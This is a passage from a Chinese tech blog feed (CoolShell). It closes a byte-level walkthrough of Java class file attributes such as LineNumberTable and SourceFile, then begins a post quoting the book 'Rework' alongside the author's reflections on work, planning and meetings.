<p>接下来我们继续以上面的例子来分析一下，从上面init方法的Code属性的截图中可以看出，属性表的长度为0x00000026,max_stack的 值为0x0002,max_locals的取值为0x0001,code_length的长度为0x0000000A，那么00000149h- 00000152h为字节码，接下来exception_table_length的长度为0x0000，而attribute_count的值为 0x0001，00000157h-00000158h的值为0x000E,它表示常量池中属性的名称，查看常量池得知第14个常量的值为 LineNumberTable，LineNumberTable用于描述java源代码的行号和字节码行号的对应关系，它不是运行时必需的属性，如果通 过-g:none的编译器参数来取消生成这项信息的话，最大的影响就是异常发生的时候，堆栈中不能显示出出错的行号，调试的时候也不能按照源代码来设置断 点，接下来我们再看一下LineNumberTable的结构如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>其中attribute_name_index上面已经提到过，表示常量池的索引，attribute_length表示属性长度，而start_pc和 line_number分表表示字节码的行号和源代码的行号。本例中LineNumberTable属性的字节流如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>上面分析完了TestClass的第一个方法，通过同样的方式我们可以分析出TestClass的第二个方法，截图如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>其中access_flags为0x0001,name_index为0x000F,descriptor_index为0x0010，通过查看常量池可 以知道此方法为public int instanceMethod(int param)方法。通过和上面类似的方法我们可以知道instanceMethod的Code属性为下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>最后我们来分析一下，Class文件的属性，从00000191h-00000199h为Class文件中的属性表，其中0x0011表示属性的名称，查看常量池可以知道属性名称为SourceFile，我们再来看看SourceFile的结构如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>其中attribute_length为属性的长度，sourcefile_index指向常量池中值为源代码文件名称的常量，在本例中SourceFile属性截图如下：</p>
<p style="text-align: left;"><img alt="image placeholder" ><br>
其中attribute_length为0x00000002表示长度为2个字节，而soucefile_index的值为0x0012,查看常量池的第18个常量可以知道源代码文件的名称为TestClass.java</p>
<p>最后，希望对技术感兴趣的朋友多交流。个人微博：（<a href="https://weibo.com/xmuzyq" target="_blank">http://weibo.com/xmuzyq</a>)</p>
<div id="xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd">(全文完)</div>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-03-05T23:28:51+08:00</pubDate>
<guid>https://coolshell.cn/articles/9229.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 《Rework》摘录及感想 ]]></title>
<link>https://coolshell.cn/articles/9156.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >读了《Rework》这本书好多遍，每次读都有不同的感想。但从来没有把这些感想记录下来，今天把《Rework》书中的一些章节做一些摘录，并把我的一些感想总结出来。供大家参考。这是一本平生以来让我中毒很深的书，也是一本让我思考得很多的书。希望看到这篇文章的人都能好好地读读这本书。这本书并不难读，是一本你可以一口气不中断就可以读完的书。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%8E%B0%E5%AE%9E%E4%B8%96%E7%95%8C" title="现实世界">现实世界</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%A2%AB%E9%AB%98%E4%BC%B0%E7%9A%84%E4%BB%8E%E9%94%99%E8%AF%AF%E4%B8%AD%E5%AD%A6%E4%B9%A0" title="被高估的“从错误中学习”">被高估的“从错误中学习”</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%AE%A1%E5%88%92%E5%B0%B1%E6%98%AF%E7%9E%8E%E7%8C%9C" title="计划就是瞎猜">计划就是瞎猜</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%8B%92%E7%BB%9D%E5%A3%AE%E5%A4%A7" title="拒绝壮大">拒绝壮大</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%B7%A5%E4%BD%9C%E7%8B%82" title="工作狂">工作狂</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%8C%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%97%92%E5%A4%84" title="挠自己的痒处">挠自己的痒处</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%B2%A1%E6%97%B6%E9%97%B4%E4%B8%8D%E6%98%AF%E5%80%9F%E5%8F%A3" title="“没时间”不是借口">“没时间”不是借口</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%94%BB%E6%B2%99%E4%B8%BA%E7%95%8C%EF%BC%8C%E7%AB%8B%E5%9C%BA%E6%98%8E%E7%A1%AE" title="画沙为界，立场明确">画沙为界，立场明确</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%89%BE%E5%A5%BD%E9%80%80%E8%B7%AF%E6%97%A0%E5%BC%82%E4%BA%8E%E5%A4%B1%E8%B4%A5" title="找好退路无异于失败">找好退路无异于失败</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E6%9D%A1%E4%BB%B6%E5%8F%97%E9%99%90%E6%98%AF%E5%A5%BD%E4%BA%8B" title="条件受限是好事">条件受限是好事</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E4%B8%8E%E5%85%B6%E5%81%9A%E4%B8%AA%E5%8D%8A%E6%88%90%E5%93%81%EF%BC%8C%E4%B8%8D%E5%A6%82%E5%81%9A%E5%A5%BD%E5%8D%8A%E4%B8%AA%E4%BA%A7%E5%93%81" title="与其做个半成品，不如做好半个产品">与其做个半成品，不如做好半个产品</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%85%B3%E6%B3%A8%E4%B8%8D%E5%8F%98%E5%9B%A0%E7%B4%A0" title="关注不变因素">关注不变因素</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#%E4%BC%9A%E8%AE%AE%E6%9C%89%E6%AF%92" title="会议有毒">会议有毒</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E4%BA%BA%E4%BA%BA%E9%83%BD%E5%BE%97%E5%B9%B2%E6%B4%BB" title="人人都得干活">人人都得干活</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E6%8B%92%E7%BB%9D%E7%85%A7%E6%90%AC_%E5%B0%86%E4%BD%A0%E7%9A%84%E4%BA%A7%E5%93%81%E5%8E%BB%E5%95%86%E5%93%81%E5%8C%96" title="拒绝照搬 &amp; 将你的产品去商品化">拒绝照搬 &amp; 将你的产品去商品化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#%E5%81%9A%E5%BE%97%E6%AF%94%E5%AF%B9%E6%89%8B%E5%B0%91" title="做得比对手少">做得比对手少</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#%E8%B0%81%E5%9C%A8%E4%B9%8E%E4%BB%96%E4%BB%AC%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88" title="谁在乎他们在干什么">谁在乎他们在干什么</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#%E5%85%BB%E6%88%90%E5%AF%B9%E5%AE%A2%E6%88%B7%E8%AF%B4%E4%B8%8D%E7%9A%84%E4%B9%A0%E6%83%AF" title="养成对客户说“不”的习惯">养成对客户说“不”的习惯</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#%E4%B8%8D%E8%A6%81%E6%94%80%E5%AE%A2%E6%88%B7%E7%9A%84%E9%AB%98%E6%9E%9D" title="不要攀客户的高枝">不要攀客户的高枝</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#%E4%B8%80%E5%A4%9C%E6%88%90%E5%90%8D%E5%8F%AA%E6%98%AF%E4%BC%A0%E8%AF%B4" title="一夜成名只是传说">一夜成名只是传说</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#%E5%91%98%E5%B7%A5%E4%B8%8D%E6%98%AF13%E5%B2%81" title="员工不是13岁">员工不是13岁</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%8E%B0%E5%AE%9E%E4%B8%96%E7%95%8C"></span>现实世界<span class="ez-toc-section-end"></span>
</h4>
<p>“这在现实世界里面行不通”，当你向人们介绍一个新创意时，人们总是这么回答你。这个“现实世界”听起来如此令人沮丧，……只有人耳熟能详，习以为常的事情才会胜利，即使是这些事情已经漏洞百出陈腐低效。</p>
<p>揭开“现实世界”这个锅盖，你会发现居住在里的人都充斥着悲观主义和失望的情绪。更糟的是，他们想将别人拖进他们的坟墓。如果你是充满希望和野心的人，他们会试着说服你，你的想法是不可能的。他们会说你在浪费时间。</p>
<p><strong>“现实世界”并不存在，那只是人的一个借口。只是某些人为了开脱 自己的无所作为，跟你一点关系也没有。</strong></p>
<blockquote><p><strong>感想</strong>：我经常会向一同事和朋友提及一些我的想法，朋友同事们经常会回答我——这个事某某人，某某团队做过了，没成功。或是对我说，你做这个事的时候，要小心这个要小心那个。我觉得，这个时候是最考验我们的时候了，要有一个清醒的头脑去分析别人的话，别人真不代表自己。这个世界上大多数人都是比较保守的，大多数都对这个现实世界都有或多或少的恐惧感。当然，你可以选择做大众，但是如果你想让你的人生有些不同，有些精彩，我还是建议你不要和大多数人想得一样，<strong>如果你和大多数人的想法一样，你必然会和大多数人一样的平庸</strong>。当然，如果你和大多数人不一样，你要么就是天才，要么就是傻瓜。要证明你自己是不是傻瓜，我们可以看看我们过去有没有过一些小成功或小成绩。如果有，那么就应该大胆地坚持自己的想法。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E8%A2%AB%E9%AB%98%E4%BC%B0%E7%9A%84%E4%BB%8E%E9%94%99%E8%AF%AF%E4%B8%AD%E5%AD%A6%E4%B9%A0"></span>被高估的“从错误中学习”<span class="ez-toc-section-end"></span>
</h4>
<p>你真的从错误和失败里面学到什么了吗？你也许学到了别再重蹈覆辙，但是这有什么意义吗？你仍然不知道接下来该做什么。</p>
<p><span id="more-9156"></span></p>
<p><strong>相反的应该从成功中汲取养分。成功給予真正靠得住的教材。</strong></p>
<p>失败并不是成功的先决条件。自然规律是，<strong>逗留在过去的失败中是无法进化的，进化是建立在成功的基础上的</strong>。</p>
<blockquote><p><strong>感想</strong>：我见过和很多人都在抱怨这不好那不好，但是他们其实并不知道什么是好的，因为——没有见过好的，你将永远不知道什么是好的。就好像你没有见过什么是汽车，你就只会整天在抱怨为什么骑自行车太累。回头想想我们的编程的这个过程也是一样，我们编程技能的提高基本上都是在看到别人的那些漂亮优雅的代码。所以，你一定要去看看那些优秀人干是怎么想的，怎么干的，去那些成功的公司开开眼界。另外，你应该多想想你过去做成功过什么事？那些才是你的长处，才是让你进化的前提。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E8%AE%A1%E5%88%92%E5%B0%B1%E6%98%AF%E7%9E%8E%E7%8C%9C"></span>计划就是瞎猜<span class="ez-toc-section-end"></span>
</h4>
<p>除非你是算命先生，长期的商业计划是种幻想。有太多的事实证明那是超出你的掌控的：市场环境、对手、顾客、经济等等。做计划让你觉得一切尽在掌握但实际上你没有。</p>
<p><strong>当你把计划变成猜测时，就等于进入一个危险的境地。做计划就是在用过去推导未来，等于给你戴上了眼罩。</strong></p>
<blockquote><p><strong>感想</strong>：你有职业规划吗？如果你有的话，那么你就一定就错了。职业规划是一件很扯淡的事情。我和一些高手都交流过，其实这些人在当初都并不有什么职业规划的，要说有的话，也就是想把技术搞透搞精。这些人在一开始从来没有想过要当个什么经理或是什么架构师之类的东西，这些人就是对技术有非常大的热情，把身边的那些看得见够得着的事情做到好好地，并且保持不持续强大的好奇心努力地学习自己不懂的东西。一个坚定不移的决定和意志力会比任何的计划和职业规划都重要。<strong>你问问自己，想不想当程序员，能不能一辈子都当一个程序员，能不能写程序写一辈子？</strong>（关于做一辈子程序员这个事，大家可以看看我的<a href="https://weibo.com/1401880315/zmebaF5tQ" target="_blank" rel="noopener">新浪微博</a> ——<em>没哪个行业能像计算机行业这么活跃、刺激和有趣了。不仅是新兴工业革命的主力，又渗入到所有的行业中，干一辈子值了。//<a href="https://weibo.com/n/_%E4%BD%A0%E4%BA%B2%E7%88%B1%E7%9A%84%E5%81%8F%E6%89%A7%E7%8B%82">@_你亲爱的偏执狂</a>: 程序员首先是工程师，Professional，就跟律师，医生一样，给大家解决问题；但是另一面呢，又是艺术家，创造新奇好玩的东西。这样的职业做一辈子有什么问题？</em>）</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E6%8B%92%E7%BB%9D%E5%A3%AE%E5%A4%A7"></span>拒绝壮大<span class="ez-toc-section-end"></span>
</h4>
<p>规模越大你就得承受更大压力、需要更专业、拥有更强的能力。</p>
<p><strong>有没有注意到，一个小公司希望自己变大时，大公司却想要变得灵活变通</strong>。记住，一旦你变大了就很难在不解雇人、不破坏士气、不改变你的整个商业路线的情况下收缩规模。</p>
<p>扩张不必成为你的目标。我们也不是仅在讨论你已有员工数。 还有花费、租金、IT 基础结构、设备等。这些事情不会碰巧发生。 你来决定是否承受这些。如果你决定去承受，你也将遇到新的头痛问题。花费那么多，你强迫自己构建一个复杂的生意，有一大堆困难而高压的事情要解决。</p>
<p><strong>小公司并不是一个起步，小公司本身就是一个伟大的目标。</strong></p>
<blockquote><p><strong>感想</strong>：很多人都会以为拥有一支成百上千人的团队而成为一个成功的标志。就像很多朋友和猎头都会问我管多少人，当我说，我就管个十人不到的团队时，他们似乎都会觉得我很平庸。他们中的一些人基本上就不会再问我在干些什么了，因为他们可能觉得这么少的人都干什么大事呢？。当然，我说了他们也不一定听得懂。人多可能恰恰说明你可能在干一个劳动密集型的事情，这并没有什么可自豪的。真正自豪的不是在战争中用人海战术让大量的人去当炮灰，而是用一个小分队端掉敌军的军火库或指挥部。所以，<strong>关键不是你有多少人，关键是你做的事是不是有非凡的意义，而且你用了最小当量的资源。这就好像建立一个高性能的网站一样，用成百上千的服务器不算本事，谁用的少才是本事</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%B7%A5%E4%BD%9C%E7%8B%82"></span>工作狂<span class="ez-toc-section-end"></span>
</h4>
<p>工作狂的行为不但没有必要，而且愚蠢至极。过多的工作并不代表你对项目更关注，也不代表你作了更多的贡献，这仅仅意味着你干了更多的活而已。<strong>工作狂制造的麻烦比解决的麻烦多</strong>。</p>
<p>工作狂往往不得要领。他们花大把大把的时间去解决问题，<strong>他们以为能靠蛮力来弥补思维上的惰性，其结果就是折腾出一堆粗糙无用的解决方案</strong>。</p>
<p><strong>如果你只是为了工作而工作，那么你就会丧失判断力。你的价值 观和决策方式都是扭曲</strong>。你没有能力去判断哪些工作值得做，哪些工作该放弃，最后搞得自己筋疲力尽，而一个筋疲力尽的人是无法作出明智的决定的。</p>
<p><strong>工作狂不是英雄。他们不是在节约时间而是在浪费生命。真正的英雄早已想出了办法，搞定一切，然后回家了。</strong></p>
<blockquote>
<p><strong>感想</strong>：这让我想到了那些为了冲业绩的业绩KPI的制订者们，很多时候，他们的价值观和决策真是的很扭曲的。他们生生地把一种技术密集型的工作变成了劳动密集型。<strong>他们其实就是在拼命地训练客户需要的那匹“更快的马”，而从来没有想过要去造个更快的交通工具。</strong></p>
<p>另外，每当我在优秀员工的评比和员工的绩效考核中的跨团队比较中我们能听到很多很多的人说，XX员工工作任劳任愿，工作得很晚很晚，付出很大。老实说，我真的为这样的价值观感到悲哀。最后，我还想说说关于超时工作，我也经常学习和做自己的事情到深夜，我相信很多人也这样，但我们应该认真思考一下Rework中的这个观点，<strong>我们超时工作是在使用蛮力呢？还是在使用热情和兴趣呢？</strong></p>
</blockquote>
<h4>
<span class="ez-toc-section" id="%E6%8C%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%97%92%E5%A4%84"></span>挠自己的痒处<span class="ez-toc-section-end"></span>
</h4>
<p>想要创造一款伟大的产品或者是某项卓越的服务，最直接、最简单的方法就是去做你自己想用的东西。设计你了解的产品——你就能很快发现它到到底好不好用。</p>
<p><strong>最棒的是，“解决你实际遇到的问题”会让你爱上你做的事情</strong>。 你知道问题所在并且熟知解决它的价值。这是无法替代的。毕竟，你会充满希望的在接下来的日子里继续做。 甚至会占据你余生所有时间。所以，最好还是做自己真正关心的东西。</p>
<blockquote>
<p><strong>感想</strong>：这就是吃自己的狗食，做自己感兴趣的事。软件项目中，我最恨的就是那种闭门造车造出来的自己都不用的东西（不是从已有业务生长出来的东西），以及那些自己不动手就在边上指指点点的各种咨询师或是喜欢动用行政命令的高层管理者。</p>
<p>但是，在这里，我更想说说我所理解的另一层“挠自己痒处”——有天我和一前前同事聊天，她说她在那家公司十多年了，现在老了，虽然心不老还想折腾，但是对自己的能力没自信，求稳了。我听到很多朋友想对自己有个改变，比如有QA的同学想做开发，有生活在内地的朋友想来大城市的大公司里有更爽的经历，<strong>这些人明明想活得更有激情，但最终在现实面前认命妥协。我说既然有痒处，还比较痒，那就应该毫不犹豫革自己的命，轰轰烈烈地活一次</strong>。别等老了后悔当年没有勇气。“挠自己痒处”就是挑战自己，革自己的命，既然想了，就做吧，生命只有一次，值得我们轰轰烈烈地去为之付出。</p>
</blockquote>
<h4>
<span class="ez-toc-section" id="%E6%B2%A1%E6%97%B6%E9%97%B4%E4%B8%8D%E6%98%AF%E5%80%9F%E5%8F%A3"></span>“没时间”不是借口<span class="ez-toc-section-end"></span>
</h4>
<p>人们最常用的借口是：“时间不够。”他们宣称很想开一家公司，学一种乐器，写一本书，等等，但时间不够用。拜托，如果你善加利用，时间总是有的。</p>
<p>把看电视或玩魔兽的时间腾出来完成你的创意；把10点上订改成11点上床，这不是怂恿你通宵达旦或是一天干足16个小时——我们要说的是，第周匀出一些业余时间来，就足够你去做些事情了。</p>
<p>当你拥有某种强烈的渴望时，你就能挤出时间来——不管你身上是否背负着其他责任。<strong>事实上，真相是大多数的渴望并不是那么强烈。于是他们拿时间当借口来自我开脱。别给自己错口。</strong></p>
<p>另外，永远会有正当其时的时候，你总会觉得自己会么太年轻，要么太老，要么太忙，太穷，或是别的什么原因。<strong>如果你总是为遇到一个完美时机而发愁，那么，完美的时机绝对不会到来</strong>。</p>
<blockquote><p><strong>感想</strong>：我在“<a title="挑战无处不在 " href="https://coolshell.cn/articles/7048.html" target="_blank" rel="noopener">挑战无处不在</a>”中也表达过这样的观点，<strong>关于热情和态度，说白了就是不要给自己找借口</strong>。比如：“工作忙事多没时间学所以可以不懂”，“工作中没用到所以可以不懂”，“工作没有挑战，一直没有遇到合适的项目”等等。而且，如果你只能在万事俱备的情况下才能做事，那么，你还有什么价值呢？人的价值和竞争力就是在条件并不完美的时候还能搞定事情。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E7%94%BB%E6%B2%99%E4%B8%BA%E7%95%8C%EF%BC%8C%E7%AB%8B%E5%9C%BA%E6%98%8E%E7%A1%AE"></span>画沙为界，立场明确<span class="ez-toc-section-end"></span>
</h4>
<p>坚定的信念能为你赢得超级粉丝，他们会为你马首是瞻，会舍身保护你，他们充满激情的口碑传播将胜过这世间一切的广告。</p>
<p>强大的主见，也是要付出代价的，在这个过程中，会有人诋毁你，说像傲慢，冷漠。没办法，这就是人生，有人喜欢你，就有人憎恨你。如果你的说法没有引起任何人的心烦意乱，只能说明你的推广力度可能还不够。（也可能代表你比较无趣）</p>
<p><strong>对我们来说，我们的产品所不能处理的和我们的产品所能处理的一样令人感到骄傲</strong>。</p>
<p>我们的产品不适合每一个人，没有关系，我们愿意为了那些更加深爱我们的客户而放弃另一部分客户。这就是我们的立场。</p>
<blockquote><p><strong>感想</strong>：我从来不想做一个大众脸。酷壳上有很多比较有争议的文章，也有很多人说我很极端，偏执，有优越感，清高……，说什么的都有，无所谓。我有一个做新闻编辑的太太，主辑要求文章要客观和没有观点，不温不火，本来好好的一篇有观点的文章被编辑过后只剩下了一堆食之无味的文字。<strong>我喜欢有鲜明的观点，因为鲜明的观点和立场能不但能让文章鲜活起来，而且还能迎来更多的不同意见和更多的思考</strong>（而不只是“顶”“赞”之类无意义的回复）。我并不希望我的观点是正确的，我只希望能和更多的人加入我一同思考，而思考最佳的催化剂就是争论。我从这个行为中收益到了很多很多。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E6%89%BE%E5%A5%BD%E9%80%80%E8%B7%AF%E6%97%A0%E5%BC%82%E4%BA%8E%E5%A4%B1%E8%B4%A5"></span>找好退路无异于失败<span class="ez-toc-section-end"></span>
</h4>
<p>你还常常听到：“你的退出战略是什么？（万一不成功，你怎么办）”甚至在你刚开始启动时就听到它。这些人不知道怎么开始就要想到怎么结束？急什么呢？如果在全情投入之前就想怎么撤出，这种逻辑不是一般的混乱。</p>
<p>你正打算恋爱一场就计划着分手？你在第一次约会时就签订婚前协议？你会在婚礼早上先约见离婚律师？那也太荒谬了吧。</p>
<p><strong>你需要的是承诺战略而不是退出战略。你要考虑的是你的项目怎样发展和成功，而不是怎样撤退</strong>。如果整个战略是基于撤退的，一开始你就不会有机会成功。</p>
<blockquote><p><strong>感想</strong>：几年前，我有一个朋友被创新工场忽悠从美国退学回来创业，我非常质疑他退学创业这个事。他对我说，没事，反正就算失败我也不会失去什么。还有一个朋友一年前从美国回国创业，也对我说，就算没搞好也没什么。我都对他们说，如果你以为用试一试的态度就可以把一个事情搞成功，那么你让这世上那些Full Time全天候从事这个事情的并有一些积累的人情何以堪？如果你创业时都想好了失败，那就说你你对这个事没有必胜的信心，也说明连你自己都不相信这个事，你还干个什么劲啊？<strong>你与其把时间用在思考如果创业没成功你会怎么办上，你还如去思考一下如何做才有更大的胜算</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E6%9D%A1%E4%BB%B6%E5%8F%97%E9%99%90%E6%98%AF%E5%A5%BD%E4%BA%8B"></span>条件受限是好事<span class="ez-toc-section-end"></span>
</h4>
<p>“我没有足够的时间、钱、人手、经验”。不要现无谓的抱怨了。“少”不是什么坏事。“条件受限”貌似缺陷，实力优势。有限的资源能激发你在现有的条件下完成任务的能力。没有一点浪费空间，一切都需要你发挥最大的创造力。</p>
<p>你见过囚犯用肥皂和汤勺制作武器吗？你们是“创新”的典范。只有在条件受到限制时，我们才会发挥出“小材大用”的能力。</p>
<blockquote><p><strong>感想</strong>：我相信这世上很多事情都是被条件受限逼过去的。我回想到我以前经常在干的性能调优，想尽一切办法榨干系统资源这件事上，我就无法不赞同这句话。想想淘宝的TFS，就是一个因为条件受限到了不得不自己干的时候，被逼出来的东西。如果你没有足够多的人，你才会去想要怎么去优化工作和开发效率，于是才会逼着你去开发一些自动化的工具，而这些工具恰恰解放了生产力可以让你更快地干更多的事。<strong>只有条件受限，才会从劳动密集型中激发出知识密集型的东西</strong>。再回到以前我的那篇“<a title="我们需要专职的QA吗？" href="https://coolshell.cn/articles/6994.html" target="_blank" rel="noopener">是否需要专职的QA</a>”一文说的到东西，如果你有很多很多帮你做测试的QA，你就不会去测试，你的团队也就不会有自动化测试等工具。这就好像在中国这个劳动力又多又廉价的大国下，基本上不需要你在技术上的创新，你只需要去不断地迁就这些低端用户，迁就这些用户越多，你还能有什么重大创新吗？真正的创新是帮助用户成长，而不是迁就用户。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%B8%8E%E5%85%B6%E5%81%9A%E4%B8%AA%E5%8D%8A%E6%88%90%E5%93%81%EF%BC%8C%E4%B8%8D%E5%A6%82%E5%81%9A%E5%A5%BD%E5%8D%8A%E4%B8%AA%E4%BA%A7%E5%93%81"></span>与其做个半成品，不如做好半个产品<span class="ez-toc-section-end"></span>
</h4>
<p>同时做N件事的结果就是：一大把绝妙的点子最后被转化成一个蹩脚的产品。</p>
<p>有舍才有得，砍掉多余的野心，你就会发现慢慢做一件正事要胜过毛毛躁躁地做一堆傻事。</p>
<p>很多东西都是越简短越好。拿起斧子动手砍吧，为了一个“伟 大”的起点，让我们把那些“挺不错”地枝节给砍掉吧。</p>
<blockquote><p><strong>感想</strong>：这正如“<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank" rel="noopener">为什么中国的网页设计这么烂</a>”中说的：“中国的学生只是去记忆东西而不是真正的理解。他们从来不花时间去思考，而只是贪婪地去获取更多的信息”。与其记忆那么多的东西，还不如好好理解部分的东西。还有一种说法是：“Done is better than Perfect!”，这句话某些时候说得也挺对的，尤其是对于那些完美地长期不能Done的项目。但是Done一个Ugly的东西还不如不做。所以平衡Done和Perfect的方式正好就是这句话——“与其做个半成品，不好做好半个产品”，因为，<strong>一个半成品会让人绝望，而半个好产品会让人有所期望，这就是其中的不同</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E6%B3%A8%E4%B8%8D%E5%8F%98%E5%9B%A0%E7%B4%A0"></span>关注不变因素<span class="ez-toc-section-end"></span>
</h4>
<p><strong>很多公司和人都关注即将到来的大事件。他们热衷于新鲜热辣的事物，追逐最新的潮流和技术</strong>。</p>
<p>这是一条愚笨之路。一旦走上这条路，你就会关注时髦、放弃本质，把注意力放到不断变化的事物上，而不是持久不变的事物上。</p>
<p>你的事业的核心应该建立在不变的基础之上。<strong>你应该投资于那些人们现在需要，并且十年后仍然需要的事物上</strong>。</p>
<p>要记住，时尚会凋零。只有当你聚焦于长久的功能时，你才会发现自己把握住了永不落伍的东西。</p>
<blockquote><p><strong>感想</strong>：一年多前，我在《<a href="https://coolshell.cn/articles/5815.html" target="_blank" rel="noopener">来信、创业和移动互联网</a>》中谈到过那个时尚的“移动互联网”，说了四个方向：阅读，分享交流，电商，推荐/提醒。大家可以看到现在地铁上已经不像以前很多人都在看报纸了，而是很多人都在看手机。而手机端的社交（分享和交流），电子商务，以及很多推荐、提醒都越来越火了。这些东西都是都是“常量”——十年前存在，未来十年也会存在，我们看到很多人太过着眼于手机上的应用，而不是那些不变的因素。今天还有两个巨火无比的流行词，一个是云计算，一个是大数据，那些一听到这两个词就会兴奋的人，我不知道他们有没有真正理解这两词？他们真正理解了云计算其实就是那个N多年前就提过的IT服务，关于大数据，我完全不知道为什么会火，你会因为听到中国人口有13亿你就会兴奋吗？老鼠的数量比较这个更多呢，呵呵。其实，数据无所谓大小之分，只有好数据和烂数据之分，还热数据和冷数据之分。十年前有两个更为流行的词：一个是计算网格，一个是数据网格，这两个词5年前就凋零了，今天的云计算和大数据，有多少人意识到了其中有什么相通的，或是其中的不变因素是什么？<strong>大数据和云计算其实都在描述两个东西，一个是超大规模的计算能力，另一个则是服务。还有一个词是“平台化”，这可能被大家忽略了，通过平台进行计算和数据服务，这才是那计算机存在以来基本不变的东西，无论你是移动互联网，还是互联网，不管是云计算，还是大数据，都需要一个平台提供服务</strong>。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%BC%9A%E8%AE%AE%E6%9C%89%E6%AF%92"></span>会议有毒<span class="ez-toc-section-end"></span>
</h4>
<p>世人最可恨的打扰莫过于开会。原因是：</p>
<ul>
<li>会议中充斥着纸上谈兵和抽象的概念，大多是不切实际的。</li>
<li>会议中能传达的信息量少之又少。</li>
<li>人们在会议中容易跑题，堪比暴风雪里的芝加哥出租车还容易迷失方向。</li>
<li>会议要求做充分的准备，但是大多数人没有时间准备这些。</li>
<li>会议制定的议程常常是模糊的，根本就没有人真正清楚目标是什么。</li>
<li>会议中难免会轮到那么一两个低能人士发言，于是大家的时间都浪费在他们的扯淡上了。</li>
<li>会议具有自我繁殖功能。一次会议总能导致另外一次，以及再导出下一次，生生不息……</li>
</ul>
